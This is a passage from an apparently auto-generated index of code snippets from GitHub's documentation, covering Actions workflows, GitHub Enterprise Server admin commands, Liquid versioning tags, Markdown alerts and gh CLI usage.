CODESPACE-NAME\n```\n\n----------------------------------------\n\nTITLE: Displaying MinIO Storage URL (Shell)\nDESCRIPTION: This command displays the MinIO storage URL, which is required to configure storage for GitHub Packages.  It combines the access key, secret key, and cluster address to form the URL.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\necho \"http://${MINIO_ACCESS_KEY}:${MINIO_SECRET_KEY}@minioclustername.example.com:9000\"\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Create Event - YAML\nDESCRIPTION: This snippet configures a workflow to run when a Git reference (branch or tag) is created in the repository. It specifies the `create` event. An event will not be created when you create more than three tags at once.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  create\n```\n\n----------------------------------------\n\nTITLE: Enabling Dependency Graph via SSH Shell\nDESCRIPTION: This command enables the dependency graph on GitHub Enterprise Server via the administrative shell (SSH). It requires SSH access to the instance. It uses `ghe-config` to set the `app.dependency-graph.enabled` configuration option to `true`. No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.dependency-graph.enabled true\n```\n\n----------------------------------------\n\nTITLE: Liquid conditional operator example for FPT or GHES version\nDESCRIPTION: Example usage of Liquid conditional operator to determine content displayed based on either the Free, Pro, or Team version, or a GitHub Enterprise Server version greater than 2.21.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_8\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% ifversion fpt or ghes > 2.21 %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: SARIF Result Limit Types\nDESCRIPTION: This code block defines the types of SARIF result limits that can be encountered in GitHub Code Scanning. It differentiates between soft and hard limits. Soft limits determine how much data is displayed, while hard limits determine the maximum accepted data for processing.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-sarif-uploads/results-exceed-limit.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n# SARIF results exceed soft limits\n  Locations for an alert exceeded limits\n  Analysis SARIF file exceeded alert limits\n  Rule tags in SARIF file exceed limits\n  Alert in SARIF upload exceeded thread flow location limits\n  Repository is at risk of exceeding the alert limit.\n\n# SARIF results exceed hard limit\n  Alert(s) in SARIF file exceeded thread flow location limits\n  Analysis SARIF file rejected due to extension limits\n  Analysis SARIF file rejected due to location limit\n  Analysis SARIF file rejected due to rule tag limits\n  Analysis SARIF file rejected due to result limits\n  Analysis SARIF file rejected due to rule limits\n  Analysis SARIF file rejected due to run limits\n  All analysis uploads blocked due to alert limit\n```\n\n----------------------------------------\n\nTITLE: Using Paginate with REST Endpoint Methods in Octokit\nDESCRIPTION: This snippet shows how to use the `paginate` method with a `rest` endpoint method. It uses `octokit.rest.issues.list_for_repo` to fetch issues for a repository, leveraging the pagination features.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\niterator = octokit.paginate.iterator(octokit.rest.issues.list_for_repo, owner: \"github\", repo: \"docs\", per_page: 100)\n```\n\n----------------------------------------\n\nTITLE: Running the GitHub Apps Pipeline Locally (npm)\nDESCRIPTION: This command runs the GitHub Apps pipeline locally. It requires cloning the github/rest-api-description repository inside the local docs-internal repository and setting a GITHUB_TOKEN in your .env with (classic) repo scopes & enabling SSO for the github org. The -s and -o flags specify the source and output directories, respectively.\nSOURCE: https://github.com/github/docs/blob/main/src/github-apps/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm run sync-rest -- -s rest-api-description -o github-apps\n```\n\n----------------------------------------\n\nTITLE: Testing the action in a workflow\nDESCRIPTION: Example workflow file that uses the created action. It defines a job that runs on `ubuntu-latest` and uses the action to print a greeting message and the current time.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - name: Hello world action step\n        id: hello\n        uses: actions/hello-world-docker-action@v2\n        with:\n          who-to-greet: 'Mona the Octocat'\n      # Use the output from the `hello` step\n      - name: Get the output time\n        run: echo \"The time was ${{ steps.hello.outputs.time }}\"\n```\n\n----------------------------------------\n\nTITLE: Disabling TLS Certificate Verification - PowerShell\nDESCRIPTION: This PowerShell script disables TLS certificate verification by setting the `GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY` environment variable to `1`. This is followed by running the `config.cmd` script to configure the runner, providing the URL and token, and starting the runner with `run.cmd`. This is intended for testing purposes on Windows environments.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\n[Environment]::SetEnvironmentVariable('GITHUB_ACTIONS_RUNNER_TLS_NO_VERIFY', '1')\n./config.cmd --url https://github.com/YOUR-ORG/YOUR-REPO --token\n./run.cmd\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_PROJECT_DIR to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_PROJECT_DIR` to the GitHub Actions equivalent `${{ github.workspace }}`. This variable refers to the project directory within the CI environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_36\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.workspace }}\n```\n\n----------------------------------------\n\nTITLE: Using First-Party GitHub Action in YAML\nDESCRIPTION: This code snippet illustrates how to directly use a first-party GitHub Action in a workflow YAML file.  First-party actions have the `actions/`, `github/` or `octo-org/` prefix. This example shows using `actions/checkout`.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Function Header for Code Suggestion\nDESCRIPTION: This JavaScript snippet demonstrates a function header used to trigger code suggestions from GitHub Copilot in VS Code.  It includes a function signature that Copilot uses to generate the rest of the function's body. This requires GitHub Copilot to be properly installed and configured in VS Code.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nfunction calculateDaysBetweenDates(begin, end) {\n```\n\n----------------------------------------\n\nTITLE: Defining a Route Handler in Sinatra (Ruby)\nDESCRIPTION: This code defines a route handler that handles all POST requests to the `/event_handler` route.  It currently returns a 200 success status.  This is where the logic for handling GitHub webhook events will be added.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n  post '/event_handler' do\n\n    # ADD EVENT HANDLING HERE #\n\n    200 # success status\n  end\n```\n\n----------------------------------------\n\nTITLE: Running Vitest Tests with Fixture Root and Translations\nDESCRIPTION: This command executes Vitest tests against fixture content, including translations. It sets both the ROOT and TRANSLATIONS_FIXTURE_ROOT environment variables to specify the directories containing the fixture data and translations, respectively.  This is essential for testing functionality with controlled content and translated content.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/README.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nROOT=src/fixtures/fixtures TRANSLATIONS_FIXTURE_ROOT=src/fixtures/fixtures/translations vitest src/fixtures/tests\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_SOURCE_PROJECT_PATH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_SOURCE_PROJECT_PATH` to the GitHub Actions equivalent `${{ github.event.pull_request.head.repo.full_name }}`. Repo path.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_68\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.head.repo.full_name }}\n```\n\n----------------------------------------\n\nTITLE: Packaging Artifacts\nDESCRIPTION: This workflow uploads build artifacts after a successful build. It uses the `upload-artifact` action to store the application binary built for a specific profile.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Upload release artifact\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: {% raw %}<my-app>{% endraw %}\n          path: {% raw %}target/${{ matrix.BUILD_TARGET }}/<my-app>{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Reactivating Admin Login with ghe-reactivate-admin-login (Shell)\nDESCRIPTION: The `ghe-reactivate-admin-login` utility immediately unlocks the Management Console after an account lockout. This provides a way to quickly restore access to the console after an authentication policy lockout.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_16\n\nLANGUAGE: shell\nCODE:\n```\nghe-reactivate-admin-login\n```\n\n----------------------------------------\n\nTITLE: GitHub Organization GraphQL Response\nDESCRIPTION: This is a sample JSON response from the `GetOrgInfo` GraphQL query. It showcases the structure of the response, including the organization's login name, ID, name, and database ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/migration-destination-query.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"data\": {\n    \"organization\": {\n      \"login\": \"Octo\",\n      \"id\": \"MDEyOk9yZ2FuaXphdGlvbjU2MTA=\",\n      \"name\": \"Octo-org\",\n      \"databaseId\": 5610\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Re-running failed jobs with debug logging using gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run failed jobs with debug logging using the `gh run rerun` subcommand, the `--failed` flag, and the `--debug` flag. `RUN_ID` should be replaced with the ID of the run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun RUN_ID --failed --debug\n```\n\n----------------------------------------\n\nTITLE: Define Learning Track Names - Markdown\nDESCRIPTION: This code snippet demonstrates how to define an array of learning track names in the frontmatter of a product guides index page. The `learningTracks` array lists the identifiers for each learning track associated with the product.\nSOURCE: https://github.com/github/docs/blob/main/data/learning-tracks/README.md#_snippet_0\n\nLANGUAGE: Markdown\nCODE:\n```\nlearningTracks:\n  - getting_started\n  - continuous_integration\n  - continuous_deployment\n  - deploy_to_the_cloud\n  - hosting_your_own_runners\n  - create_actions\n```\n\n----------------------------------------\n\nTITLE: Listing GPG Secret Keys with Key ID\nDESCRIPTION: This command lists GPG secret keys with the key ID format set to long. It displays information about the secret keys, including the key ID, user ID, and expiration date.  The output shows an example of a GPG key with its key ID.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/copy-gpg-key-id.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngpg --list-secret-keys --keyid-format=long\n```\n\n----------------------------------------\n\nTITLE: Searching by User Type\nDESCRIPTION: This example shows how to search for users, specifying whether to search for personal accounts or organizations using the `type` qualifier.  The qualifier restricts search results to either personal accounts (`type:user`) or organizations (`type:org`).\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_0\n\nLANGUAGE: none\nCODE:\n```\nmike in:name created:<2011-01-01 type:user\ndata in:email type:org\n```\n\n----------------------------------------\n\nTITLE: Warning message about unnecessary git checkout\nDESCRIPTION: This text snippet presents the exact warning message that users would see regarding the unnecessary `git checkout HEAD^2` step in their workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/unnecessary-step-found.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nWarning: 1 issue was detected with this workflow: git checkout HEAD^2 is no longer\nnecessary. Please remove this step as Code Scanning recommends analyzing the merge\ncommit for best results.\n```\n\n----------------------------------------\n\nTITLE: Markdown Caution Alert Formatting\nDESCRIPTION: This snippet demonstrates the Markdown syntax for creating a 'Caution' alert within GitHub documentation. It uses a blockquote with the '[!CAUTION]' label, indicating a dangerous or destructive action requiring extreme caution.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n> [!CAUTION]\n> Be extremely careful.\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Docker Image Syntax\nDESCRIPTION: This YAML snippet shows how to define a Docker image in GitLab CI/CD using the `image` key. It defines a job named `my_job` that will run in the `node:20-bookworm-slim` Docker image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nmy_job:\n  image: node:20-bookworm-slim\n```\n\n----------------------------------------\n\nTITLE: Setting a debug message in PowerShell\nDESCRIPTION: This snippet shows how to set a debug message using the `debug` workflow command in PowerShell. Similar to the Bash example, the debug messages are only visible if the `ACTIONS_STEP_DEBUG` secret is set to `true`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_6\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::debug::Set the Octocat variable\"\n```\n\n----------------------------------------\n\nTITLE: HTTPS Cloning Error 403 Example\nDESCRIPTION: Shows another variation of HTTPS cloning error, specifically a 403 error. This usually indicates a permission issue or authentication failure when trying to access the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/creating-and-managing-repositories/troubleshooting-cloning-errors.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n> Error: The requested URL returned error: 403 while accessing\n> https://{% data variables.product.product_url %}/USER/REPO.git/info/refs\n> fatal: HTTP request failed\n```\n\n----------------------------------------\n\nTITLE: Run Individual Tests\nDESCRIPTION: Executes specific tests based on a provided filename, partial filename, or path. Allows targeted testing of individual files or directories. This is useful for focusing on specific areas of the codebase during development or debugging.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n# The TEST_NAME can be a filename, partial filename, or path to a file or directory\nnpm test -- <TEST_NAME>\n```\n\nLANGUAGE: shell\nCODE:\n```\nvitest path/to/tests/directory\n```\n\n----------------------------------------\n\nTITLE: Verifying replication status\nDESCRIPTION: This snippet shows how to verify that all replication channels report `OK` using the `ghe-repl-status` command. The `-vv` flag provides verbose output for detailed status information.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/initiating-a-failover-to-your-replica-appliance.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nghe-repl-status -vv\n```\n\n----------------------------------------\n\nTITLE: Defining Database Schema in qlpack.yml (YAML)\nDESCRIPTION: This snippet defines the path to the database schema file for a core language pack. The `dbscheme` property specifies the relative path to the `.dbscheme` file.  This is required for core language packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_20\n\nLANGUAGE: YAML\nCODE:\n```\ndbscheme: semmlecode.python.dbscheme\n```\n\n----------------------------------------\n\nTITLE: Linking to current article in different version using Liquid\nDESCRIPTION: Illustrates how to link to the current article in a different product version using the `currentArticle` property and Liquid conditionals. The link remains functional even if the article URL changes.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_8\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion fpt %}For more information, see the [{% data variables.product.prodname_ghe_cloud %} documentation](/enterprise-cloud@latest/{{ currentArticle }}).{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Using a Public Action in Subdirectory (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to use a public action located in a subdirectory of a public GitHub repository within a GitHub Actions workflow. The `uses` keyword specifies the path to the action within the repository using the format `{owner}/{repo}/{path}@{ref}`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: actions/aws/ec2@main\n```\n\n----------------------------------------\n\nTITLE: Committing Resolved Merge Conflicts\nDESCRIPTION: This command commits the staged files that have been modified to resolve merge conflicts.  The commit message indicates that merge conflicts have been resolved. This records the resolution of the conflicts in the Git history.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ngit commit -m \"Resolves merge conflicts\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Right Whitespace Trim\nDESCRIPTION: This snippet uses the `ifversion` tag and the right whitespace trim character (`-%}`) to remove trailing whitespace after the tag. It checks if the version is `fpt` or if `ghes > 2.13`.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes > 2.13 %}\n  Alpha\n{%- endif %}\n```\n\n----------------------------------------\n\nTITLE: Creating a Shell Script Within Same Repo\nDESCRIPTION: Creates a shell script named `goodbye.sh` that echoes the message \"Goodbye\". The script is created by echoing the `echo Goodbye` command into a file named `goodbye.sh`. This prepares the script for execution within the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\necho \"echo Goodbye\" > goodbye.sh\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: API\nDESCRIPTION: This code snippet demonstrates how to use the `api` tag to display content relevant to API users. It wraps instructions that are specific to API interactions.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_9\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% api %}\n\nThese instructions are pertinent to API users.\n\n{% endapi %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Multiple `ifversion` checks\nDESCRIPTION: This snippet demonstrates conditional rendering with multiple `ifversion` checks inside an `else` block.  It checks `fpt`, then GHES version greater than 2.16, then GHES version greater than 2.13.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_8\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes > 2.16 %}\n\nCharlie\n\n{% endif %}\n\n{% ifversion ghes > 2.13 %}\n\nDelta\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Finding the UUID of a node (ghe-config)\nDESCRIPTION: This command retrieves the UUID of a node in the GitHub Enterprise Server cluster based on its hostname. The UUID is needed to remove references to data services on the removed node. HOSTNAME should be replaced with the actual hostname of the node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/replacing-a-cluster-node.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-config cluster.HOSTNAME.uuid\n```\n\n----------------------------------------\n\nTITLE: Monitoring Availability using `/status` Endpoint\nDESCRIPTION: This snippet shows the URL structure for monitoring the availability of the instance by parsing the status code returned by a request to the `/status` endpoint. Replace `HOST` with your instance's hostname or an individual node's IP address.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/monitoring-a-high-availability-configuration.md#_snippet_2\n\nLANGUAGE: URL\nCODE:\n```\nhttp(s)://HOST/status\n```\n\n----------------------------------------\n\nTITLE: SCIM Root URL for GHES\nDESCRIPTION: Defines the root URL for interacting with the SCIM v2 API for GitHub Enterprise Server.  This URL is used by Identity Providers (IdPs) to manage users and groups within the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/scim.md#_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\n{% data variables.product.rest_url %}/scim/v2/\n```\n\n----------------------------------------\n\nTITLE: Nested conditional rendering for GHES\nDESCRIPTION: This snippet first checks if the version is GHES and renders 'condition-m' if it is. Then, it checks if the GHES version equals the last supported version, rendering 'condition-n' if true.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_10\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes %}\ncondition-m\n  {% ifversion ghes = __GHES_SUPPORTED__[-1] %}\n  condition-n\n  {% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Generate Replication Key Pair - Shell\nDESCRIPTION: This command is used to generate a key pair for replication on the primary appliance. It requires the primary appliance's IP address as input and returns a public key.  Copy the returned public key for use in the next steps of the replication setup process.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/generate-replication-key-pair.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup PRIMARY_IP\n```\n\n----------------------------------------\n\nTITLE: Docker Dockerfile Configuration\nDESCRIPTION: This snippet shows an example `Dockerfile` configuration for Docker, specifying the image name with the private registry URL.  This ensures the Dockerfile uses images from the private registry.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n FROM firewallregistrydep.azurecr.io/myreg/ubuntu:22.04\n```\n\n----------------------------------------\n\nTITLE: Re-running a failed workflow with debug logging using gh CLI\nDESCRIPTION: This snippet demonstrates how to re-run a failed workflow run with debug logging enabled using the `gh run rerun` subcommand and the `--debug` flag. `RUN_ID` should be replaced with the ID of the failed run.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/re-running-workflows-and-jobs.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh run rerun RUN_ID --debug\n```\n\n----------------------------------------\n\nTITLE: JavaScript Code with Copy Button\nDESCRIPTION: Demonstrates how to add a copy button to a code block within GitHub Docs. It uses the `javascript copy` syntax to enable syntax highlighting and include a button that allows users to easily copy the code sample.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst copyMe = true\n```\n\n----------------------------------------\n\nTITLE: Finalizing CodeQL database in YAML\nDESCRIPTION: This task finalizes the CodeQL database after the build process within an Azure DevOps pipeline. It executes the `codeql database finalize db` command to complete the database creation.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    - task: CmdLine@2\n       displayName: Finalize {% data variables.product.prodname_codeql %} database\n       inputs:\n          script: 'codeql database finalize db'\n```\n\n----------------------------------------\n\nTITLE: Defining the help function\nDESCRIPTION: This defines the `help` function, which currently outputs a basic usage instruction. It will be expanded later to provide more detailed information about the CLI's commands.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-cli-with-a-github-app.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\ndef help\n  puts \"usage: app_cli <help>\"\nend\n```\n\n----------------------------------------\n\nTITLE: Markdown Important Alert\nDESCRIPTION: This snippet demonstrates the 'Important' alert box in Markdown. The `[!IMPORTANT]` syntax signifies critical information that users should pay close attention to. This alert type is used to emphasize significant details.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/alerts.md#_snippet_2\n\nLANGUAGE: Markdown\nCODE:\n```\n> [!IMPORTANT]\n> This is important\n```\n\n----------------------------------------\n\nTITLE: Finding Insecure Git Operations on GHES\nDESCRIPTION: This command searches the GHES instance's logs for Git operations over SSH that use insecure algorithms or hash functions. This helps identify clients using outdated SSH configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_88\n\nLANGUAGE: shell\nCODE:\n```\nghe-find-insecure-git-operations\n```\n\n----------------------------------------\n\nTITLE: Markdown Warning Alert Formatting\nDESCRIPTION: This snippet illustrates the Markdown syntax for creating a 'Warning' alert. It uses a blockquote with the '[!WARNING]' label. This type of alert highlights potential risks to users before starting a task.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n> [!WARNING]\n> Be careful.\n```\n\n----------------------------------------\n\nTITLE: Getting service file content on Windows with PowerShell\nDESCRIPTION: This command uses PowerShell's `Get-Content` cmdlet to display the content of the _.service_ file in the runner directory on Windows. This file contains the name of the Windows service used by the runner application.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_9\n\nLANGUAGE: powershell\nCODE:\n```\nPS C:\\actions-runner> Get-Content .service\n```\n\n----------------------------------------\n\nTITLE: Downloading Upgrade Package with Curl\nDESCRIPTION: Downloads an upgrade package from the specified URL using the `curl` command. The `-L` option follows HTTP redirects, and the `-O` option saves the downloaded file with the same name as the remote file.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/download-package.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nadmin@HOSTNAME:~$ curl -L -O UPGRADE-PKG-URL\n```\n\n----------------------------------------\n\nTITLE: Changing Ownership of Directories (macOS)\nDESCRIPTION: This command changes the ownership of specified directories to the current user. It resolves permission issues that might arise after installing or updating packages with Homebrew.\nSOURCE: https://github.com/github/docs/blob/main/contributing/node-versions.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n# You should change the ownership of these directories to your user.\nsudo chown -R $(whoami) /usr/local/sbin\n```\n\n----------------------------------------\n\nTITLE: Stopping a Codespace using GitHub CLI\nDESCRIPTION: This snippet shows how to stop a codespace using the `gh codespace stop` command.  It requires the GitHub CLI to be installed and configured. When executed, it will prompt the user to select the codespace they wish to stop.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/stopping-and-starting-a-codespace.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace stop\n```\n\n----------------------------------------\n\nTITLE: HTTP Response Example for WatchEvent\nDESCRIPTION: This example demonstrates the HTTP response headers returned when querying the Events API for a WatchEvent. The `Link` header provides pagination URLs for navigating through the results.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/github-event-types.md#_snippet_0\n\nLANGUAGE: HTTP\nCODE:\n```\nHTTP/2 200\nLink: <https://api.github.com/resource?page=2>; rel=\"next\",\n      <https://api.github.com/resource?page=5>; rel=\"last\"\n```\n\n----------------------------------------\n\nTITLE: Running Unit Tests with unittest in Python\nDESCRIPTION: This bash command is used to run the unit tests created for the `BankAccount` class using the `unittest` module in Python. It executes the test suite defined in the `test_bank_account.py` file.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_2\n\nLANGUAGE: Bash\nCODE:\n```\npython -m unittest test_bank_account.py\n```\n\n----------------------------------------\n\nTITLE: Retrieve Codespaces Domains Using GitHub CLI\nDESCRIPTION: This command uses the GitHub CLI (`gh`) to retrieve a list of domains required by GitHub Codespaces. It uses the `api meta` command to fetch metadata about GitHub and then uses `jq` to extract the list of Codespaces domains.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-your-connection-to-github-codespaces.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh api meta --jq .domains.codespaces\n```\n\n----------------------------------------\n\nTITLE: Copying Migration Archive to Target - Shell\nDESCRIPTION: This command copies the migration archive from the source instance to the target GitHub Enterprise Server instance using the `scp` command. It utilizes the specified port and requires the path to the migration archive and the target hostname.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nscp -P 122 PATH-TO-MIGRATION-GUID.tar.gz admin@HOSTNAME:/home/admin/\n```\n\n----------------------------------------\n\nTITLE: Accessing the Rails Console with ghe-console - Shell\nDESCRIPTION: This snippet shows how to use the `ghe-console` utility to open the GitHub Rails console on your GitHub Enterprise Server appliance.  It is recommended to use this with support only and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nghe-console\n```\n\n----------------------------------------\n\nTITLE: Migrating Organization with GitHub 